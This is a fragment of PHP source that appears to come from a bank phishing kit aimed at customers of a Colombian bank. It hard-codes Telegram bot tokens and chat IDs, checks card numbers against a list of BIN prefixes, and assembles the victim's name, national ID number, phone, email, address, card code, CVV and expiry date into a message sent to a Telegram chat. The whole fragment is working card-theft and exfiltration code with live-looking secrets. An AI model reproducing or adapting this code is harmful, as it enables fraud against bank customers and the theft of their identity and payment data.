...
//Datos del bot
$token = "6443575945:AAFO_kXfatiC6mixrv5psHmnILP9FGZv1Uk";
$chatId = "-1001930328561";
...
// $token = "5925675372:AAEHDGY1eXZdzXipYybdtZjsQA9Bouc0RqM";
// $chatId = "-1001953592104";
...
}else if(($c == 412709 || $c == 470438 || $c == 470439 || $c == 470440 || $c == 482451 || $c == 496079 || $c == 496080 || $c == 496081 || $c == 522973 || $c == 547142 || $c == 547141 || $c == 518503) && isset($_SESSION['avvillas']) && $_SESSION['avvillas'] == "1"){
...
$mensaje = "🏦 No registra datos este bin\n📛Nombre: $nombre\n📛Apellido: $apellido\n🪪Cedula: $cedula\n📞Telefono: $telefono\n✉️ Email: $email\n 🏠Direccion: $direccion\n 🏠Ciudad: $ciudad\n Otros datos\n🪪 Codigo: $codigo\n💳 Cvv: $cvv\n 💳 CFecha: $fecha";
    enviarMensajeTelegram($chatId, $mensaje, $token);
